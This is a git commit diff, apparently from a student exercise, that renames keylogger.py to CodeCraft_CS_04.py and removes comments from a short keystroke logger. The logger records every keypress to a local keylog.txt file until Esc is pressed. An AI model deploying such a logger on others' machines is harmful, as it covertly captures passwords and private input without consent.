40feba70c70c6443788c990ac027246105d34fcd
anujith3 <2022becsiot028@mite.ac.in>
2025-08-14 00:27:44 +0530

    Update and rename keylogger.py to CodeCraft_CS_04.py

--- CodeCraft_CS_04.py
+++ CodeCraft_CS_04.py
@@ -6,14 +6,12 @@ def on_press(key):
         with open("keylog.txt", "a") as log_file:
             log_file.write(str(key.char))
     except AttributeError:
-        # Handles special keys (space, enter, etc.)
         with open("keylog.txt", "a") as log_file:
             log_file.write(f'[{key}]')
 
 def on_release(key):
-    # Optional: Stop listener if needed
     if key == keyboard.Key.esc:
-        return False  # Stop the keylogger
-
+        return False 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
